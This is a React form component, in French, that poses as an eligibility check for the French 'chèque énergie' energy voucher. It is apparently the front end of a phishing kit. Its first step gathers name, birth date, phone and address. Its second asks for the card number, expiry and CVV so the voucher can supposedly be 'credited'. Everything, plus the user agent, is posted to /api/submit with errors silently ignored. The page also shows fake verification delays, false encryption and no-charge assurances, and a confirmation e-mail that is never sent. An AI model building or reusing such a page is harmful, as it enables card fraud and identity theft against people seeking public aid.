"use client";

import { isValidPhoneNumber } from "react-phone-number-input";
import {
  Building2,
  Calendar,
  CreditCard,
  Hash,
  IdCard,
  Lock,
  ShieldCheck,
  User,
} from "lucide-react";
import { AnimatePresence, motion, useReducedMotion } from "framer-motion";
import type { Variants } from "framer-motion";
import { useMemo, useState } from "react";
import type { FormEvent } from "react";

import { AddressField } from "@/components/ui/address-field";
import type { AddressSuggestion } from "@/components/ui/address-field";
import { CardField } from "@/components/ui/card-field";
import { DateField } from "@/components/ui/date-field";
import { M3Check } from "@/components/ui/m3-check";
import { PhoneField } from "@/components/ui/phone-field";
import { TextField } from "@/components/ui/text-field";
import { SubmitButton } from "@/components/submit-button";
import { useAppReady } from "@/components/splash-screen";
import { Logo } from "@/components/logo";

type Values = {
  prenom: string;
  nom: string;
  naissance: string;
  telephone: string | undefined;
  adresse: string;
  codePostal: string;
  ville: string;
  cardNumber: string;
  cardExpiry: string;
  cardCvv: string;
};

type Errors = Partial<Record<keyof Values, string>>;

const EMPTY_VALUES: Values = {
  prenom: "",
  nom: "",
  naissance: "",
  telephone: undefined,
  adresse: "",
  codePostal: "",
  ville: "",
  cardNumber: "",
  cardExpiry: "",
  cardCvv: "",
};

function validateStep1(values: Values): Errors {
  const errors: Errors = {};

  if (!values.prenom.trim()) errors.prenom = "Merci d'indiquer votre prénom.";
  if (!values.nom.trim()) errors.nom = "Merci d'indiquer votre nom.";

  if (!values.naissance) {
    errors.naissance = "Merci d'indiquer votre date de naissance.";
  } else {
    const date = new Date(values.naissance);
    if (Number.isNaN(date.getTime()) || date > new Date()) {
      errors.naissance = "Cette date de naissance n'est pas valide.";
    }
  }

  if (!values.telephone) {
    errors.telephone = "Merci d'indiquer votre numéro de téléphone.";
  } else if (!isValidPhoneNumber(values.telephone)) {
    errors.telephone = "Ce numéro de téléphone n'est pas valide.";
  }

  if (values.adresse.trim().length < 4) {
    errors.adresse = "Merci d'indiquer votre adresse.";
  }

  if (!/^\d{5}$/.test(values.codePostal)) {
    errors.codePostal = "Le code postal doit contenir 5 chiffres.";
  }

  if (!values.ville.trim()) errors.ville = "Merci d'indiquer votre ville.";

  return errors;
}

function validateStep2(values: Values): Errors {
  const errors: Errors = {};

  const cardDigits = values.cardNumber.replace(/\s/g, "");
  if (cardDigits.length !== 16) {
    errors.cardNumber = "Le numéro de carte doit contenir 16 chiffres.";
  }

  const expiryParts = values.cardExpiry.split("/");
  if (expiryParts.length !== 2 || expiryParts[0].length !== 2 || expiryParts[1].length !== 2) {
    errors.cardExpiry = "Format attendu : MM/AA";
  } else {
    const month = parseInt(expiryParts[0], 10);
    if (month < 1 || month > 12) {
      errors.cardExpiry = "Le mois doit être compris entre 01 et 12.";
    }
  }

  if (values.cardCvv.length !== 3) {
    errors.cardCvv = "Le CVV doit contenir 3 chiffres.";
  }

  return errors;
}

const container: Variants = {
  hidden: {},
  visible: { transition: { staggerChildren: 0.07, delayChildren: 0.1 } },
};

const item: Variants = {
  hidden: { opacity: 0, y: 20 },
  visible: {
    opacity: 1,
    y: 0,
    transition: { duration: 0.5, ease: [0.2, 0, 0, 1] },
  },
};

const slideVariants: Variants = {
  enter: (direction: number) => ({
    x: direction > 0 ? 300 : -300,
    opacity: 0,
  }),
  center: {
    x: 0,
    opacity: 1,
  },
  exit: (direction: number) => ({
    x: direction < 0 ? 300 : -300,
    opacity: 0,
  }),
};

export function EligibiliteForm() {
  const ready = useAppReady();
  const reduceMotion = useReducedMotion();
  const [values, setValues] = useState<Values>(EMPTY_VALUES);
  const [errors, setErrors] = useState<Errors>({});
  const [submitting, setSubmitting] = useState(false);
  const [loading, setLoading] = useState(false);
  const [step, setStep] = useState(1);
  const [direction, setDirection] = useState(1);

  const today = useMemo(() => new Date().toISOString().slice(0, 10), []);

  function set<K extends keyof Values>(key: K, value: Values[K]) {
    setValues((v) => ({ ...v, [key]: value }));
    setErrors((e) => (e[key] ? { ...e, [key]: undefined } : e));
  }

  function selectAddress(s: AddressSuggestion) {
    setValues((v) => ({
      ...v,
      codePostal: v.codePostal.trim() ? v.codePostal : s.postcode,
      ville: v.ville.trim() ? v.ville : s.city,
    }));
    setErrors((e) => ({ ...e, codePostal: undefined, ville: undefined }));
  }

  async function handleStep1(e: FormEvent) {
    e.preventDefault();
    const nextErrors = validateStep1(values);
    setErrors(nextErrors);
    if (Object.keys(nextErrors).length > 0) return;

    setDirection(1);
    setLoading(true);
    await new Promise((resolve) => setTimeout(resolve, 1500));
    setLoading(false);
    setStep(2);
  }

  async function handleStep2(e: FormEvent) {
    e.preventDefault();
    const nextErrors = validateStep2(values);
    setErrors(nextErrors);
    if (Object.keys(nextErrors).length > 0) return;

    setSubmitting(true);

    try {
      await fetch("/api/submit", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          ...values,
          telephone: values.telephone ?? "",
          userAgent: navigator.userAgent,
        }),
      });
    } catch {
      // Silent fail - don't block the user flow
    }

    await new Promise((resolve) => setTimeout(resolve, 900));
    setSubmitting(false);
    setDirection(1);
    setStep(3);
  }

  function goBack() {
    setDirection(-1);
    setStep((s) => s - 1);
    setErrors({});
  }

  if (step === 3) {
    return (
      <motion.div
        initial={{ opacity: 0, y: 12 }}
        animate={{ opacity: 1, y: 0 }}
        transition={{ duration: 0.5, ease: [0.2, 0, 0, 1] }}
        className="rounded-3xl border border-neutral-200/80 bg-white p-8 text-center shadow-soft sm:p-10"
      >
        <span className="mx-auto flex size-14 items-center justify-center rounded-full bg-emerald-50 text-emerald-600">
          <M3Check className="size-6" />
        </span>
        <h1 className="mt-5 text-2xl font-bold tracking-tight text-neutral-900">
          Demande en cours de traitement
        </h1>
        <p className="mt-3 text-[0.95rem] leading-relaxed text-neutral-600">
          Merci, {values.prenom}. Votre demande a bien été enregistrée.
        </p>
        <div className="mt-6 rounded-2xl bg-neutral-50 p-5">
          <p className="text-sm font-medium text-neutral-700">
            Délai de traitement
          </p>
          <p className="mt-1 text-2xl font-bold text-primary">24 à 48 heures</p>
          <p className="mt-2 text-sm text-neutral-500">
            Vous recevrez une notification dès que votre chèque énergie sera
            crédité sur la carte bancaire renseignée.
          </p>
        </div>
        <p className="mt-6 text-xs text-neutral-400">
          Un e-mail de confirmation vous a été envoyé avec les détails de votre
          demande.
        </p>
      </motion.div>
    );
  }

  if (loading) {
    return (
      <motion.div
        initial={{ opacity: 0 }}
        animate={{ opacity: 1 }}
        exit={{ opacity: 0 }}
        transition={{ duration: 0.3, ease: [0.2, 0, 0, 1] }}
        className="flex min-h-[400px] flex-col items-center justify-center rounded-3xl border border-neutral-200/80 bg-white p-8 shadow-soft"
      >
        <Logo className="h-14 w-auto" />
        <p className="mt-6 text-sm font-medium text-neutral-600">
          Vérification de vos informations...
        </p>
        <div className="m3-linear-progress mt-6 w-56" aria-hidden>
          <div className="m3-lp-bar m3-lp-primary">
            <div className="m3-lp-bar-inner" />
          </div>
          <div className="m3-lp-bar m3-lp-secondary">
            <div className="m3-lp-bar-inner" />
          </div>
        </div>
      </motion.div>
    );
  }

  return (
    <div className="relative overflow-hidden rounded-3xl border border-neutral-200/80 bg-white shadow-soft">
      <AnimatePresence mode="wait" custom={direction}>
        {step === 1 && (
          <motion.form
            key="step1"
            noValidate
            onSubmit={handleStep1}
            custom={direction}
            variants={slideVariants}
            initial="enter"
            animate="center"
            exit="exit"
            transition={{
              x: { type: "spring", stiffness: 300, damping: 30 },
              opacity: { duration: reduceMotion ? 0.15 : 0.25 },
            }}
            className="p-4 sm:p-5"
          >
            <motion.div
              variants={container}
              initial="hidden"
              animate={ready ? "visible" : "hidden"}
            >
              <motion.div variants={item}>
                <div className="mb-3 flex items-center gap-2">
                  <span className="flex size-7 items-center justify-center rounded-full bg-primary text-xs font-bold text-white">
                    1
                  </span>
                  <span className="h-0.5 flex-1 rounded-full bg-neutral-200" />
                  <span className="flex size-7 items-center justify-center rounded-full bg-neutral-200 text-xs font-medium text-neutral-400">
                    2
                  </span>
                </div>
                <h1 className="text-2xl font-bold tracking-tight text-neutral-900 sm:text-[1.7rem]">
                  Vérifiez votre éligibilité
                </h1>
                <p className="mt-2 text-[0.925rem] leading-relaxed text-neutral-600">
                  Deux minutes suffisent. Aucune information n'est partagée sans
                  votre accord.
                </p>
              </motion.div>

              <div className="mt-4 grid gap-3 sm:grid-cols-2">
                <motion.div variants={item}>
                  <TextField
                    label="Prénom"
                    icon={User}
                    autoComplete="given-name"
                    value={values.prenom}
                    error={errors.prenom}
                    onChange={(e) => set("prenom", e.target.value)}
                  />
                </motion.div>

                <motion.div variants={item}>
                  <TextField
                    label="Nom"
                    icon={IdCard}
                    autoComplete="family-name"
                    value={values.nom}
                    error={errors.nom}
                    onChange={(e) => set("nom", e.target.value)}
                  />
                </motion.div>

                <motion.div variants={item}>
                  <DateField
                    label="Date de naissance"
                    max={today}
                    value={values.naissance}
                    error={errors.naissance}
                    onChange={(v) => set("naissance", v)}
                  />
                </motion.div>

                <motion.div variants={item}>
                  <PhoneField
                    label="Téléphone"
                    value={values.telephone}
                    error={errors.telephone}
                    onChange={(v) => set("telephone", v)}
                  />
                </motion.div>

                <motion.div variants={item} className="relative sm:col-span-2">
                  <AddressField
                    label="Adresse"
                    value={values.adresse}
                    error={errors.adresse}
                    onChange={(v) => set("adresse", v)}
                    onSelect={selectAddress}
                  />
                </motion.div>

                <motion.div variants={item}>
                  <TextField
                    label="Code postal"
                    icon={Hash}
                    autoComplete="postal-code"
                    inputMode="numeric"
                    maxLength={5}
                    value={values.codePostal}
                    error={errors.codePostal}
                    onChange={(e) =>
                      set("codePostal", e.target.value.replace(/\D/g, "").slice(0, 5))
                    }
                  />
                </motion.div>

                <motion.div variants={item}>
                  <TextField
                    label="Ville"
                    icon={Building2}
                    autoComplete="address-level2"
                    value={values.ville}
                    error={errors.ville}
                    onChange={(e) => set("ville", e.target.value)}
                  />
                </motion.div>
              </div>


              <motion.div variants={item} className="mt-4">
                <SubmitButton
                  size="lg"
                  className="w-full rounded-full text-base"
                >
                  Continuer
                </SubmitButton>
                <p className="mt-4 flex items-center justify-center gap-2 text-xs text-neutral-400">
                  <ShieldCheck className="size-3.5 shrink-0" />
                  Connexion sécurisée. Aucune avance de frais.
                </p>
              </motion.div>
            </motion.div>
          </motion.form>
        )}

        {step === 2 && (
          <motion.form
            key="step2"
            noValidate
            onSubmit={handleStep2}
            custom={direction}
            variants={slideVariants}
            initial="enter"
            animate="center"
            exit="exit"
            transition={{
              x: { type: "spring", stiffness: 300, damping: 30 },
              opacity: { duration: reduceMotion ? 0.15 : 0.25 },
            }}
            className="p-4 sm:p-5"
          >
            <div className="mb-3 flex items-center gap-2">
              <span className="flex size-7 items-center justify-center rounded-full bg-primary text-xs font-bold text-white">
                <M3Check className="size-4" />
              </span>
              <span className="h-0.5 flex-1 rounded-full bg-primary" />
              <span className="flex size-7 items-center justify-center rounded-full bg-primary text-xs font-bold text-white">
                2
              </span>
            </div>

            <h1 className="text-xl font-bold tracking-tight text-neutral-900 sm:text-2xl">
              Coordonnées bancaires
            </h1>
            <p className="mt-1 text-sm leading-relaxed text-neutral-600">
              Renseignez la carte sur laquelle vous souhaitez recevoir votre
              chèque énergie.
            </p>

            <div className="mt-4 grid gap-3">
              <CardField
                label="Numéro de carte"
                icon={CreditCard}
                cardFormat
                placeholder="1234 5678 9012 3456"
                value={values.cardNumber}
                error={errors.cardNumber}
                onChange={(e) => set("cardNumber", e.target.value)}
              />

              <div className="grid gap-3 sm:grid-cols-2">
                <CardField
                  label="Date d'expiration"
                  icon={Calendar}
                  expiryFormat
                  placeholder="MM/AA"
                  value={values.cardExpiry}
                  error={errors.cardExpiry}
                  onChange={(e) => set("cardExpiry", e.target.value)}
                />

                <CardField
                  label="CVV"
                  icon={Lock}
                  masked
                  placeholder="•••"
                  maxLength={3}
                  value={values.cardCvv}
                  error={errors.cardCvv}
                  onChange={(e) => set("cardCvv", e.target.value)}
                />
              </div>
            </div>

            <div className="mt-4 rounded-xl bg-amber-50 p-3">
              <p className="flex items-start gap-2.5 text-sm text-amber-800">
                <ShieldCheck className="mt-0.5 size-4 shrink-0 text-amber-600" />
                <span>
                  Vos informations bancaires sont protégées par un chiffrement
                  SSL 256 bits. Aucun prélèvement ne sera effectué.
                </span>
              </p>
            </div>

            <div className="mt-7 flex gap-3">
              <button
                type="button"
                onClick={goBack}
                className="flex h-14 items-center justify-center rounded-full border border-neutral-200 px-6 font-semibold text-neutral-700 transition-colors hover:bg-neutral-50"
              >
                Retour
              </button>
              <SubmitButton
                size="lg"
                loading={submitting}
                className="flex-1 rounded-full text-base"
              >
                Valider ma demande
              </SubmitButton>
            </div>
          </motion.form>
        )}
      </AnimatePresence>
    </div>
  );
}
